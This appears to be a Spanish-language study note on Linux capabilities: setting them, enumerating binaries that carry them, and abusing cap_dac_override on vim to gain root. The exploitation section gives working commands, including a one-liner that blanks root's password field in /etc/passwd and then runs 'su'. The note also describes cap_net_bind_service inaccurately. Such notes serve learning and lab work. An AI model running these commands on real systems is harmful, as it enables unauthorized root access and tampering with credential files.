Las capacidades de Linux son una caracteristica de seguridad que permite conceder privs especificos a los procesos, permitiendoles realizar acciones concretas que de otro modo estarian restringidas

#### Establecer capabilities

```
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Cuando le establecemos capabilities a un binario, este podra realizar acciones especificas que no podrian realizar sin ellas, en este caso con `cap_net_bind_service` se podra conectar a puertos de red

## Enumerar capabilities

Enumerar binarios con capabilities establecidas:

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

## Explotacion

Si obtuvimos acceso al sistema con una cuenta de privs bajos y descubrimos `cap_dac_override`:

```
getcap /usr/bin/vim.basic
```
![[Pasted image 20260918131556.png]]

vim se ejecuta sin privs pero con cap_dac_override puede escalar los privs del usuario que lo ejecuta

Ya que tenemos vim podriamos por ejemplo eliminar la X de /etc/passwd del usuario root para que su login no tenga creds:

- Miramos el archivo /etc/passwd

```
cat /etc/passwd | head -n1
```
![[Pasted image 20260918131823.png]]

- Usamos vim para eliminar la X de forma interactiva:

```
/usr/bin/vim.basic /etc/passwd
```
![[Pasted image 20260918131919.png]]

O de forma no interactiva:

```
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

- Revisamos:

```
cat /etc/passwd | head -n1
```
![[Pasted image 20260918131958.png]]

- Ejecutamos su para iniciar sesion como root

```
su
```
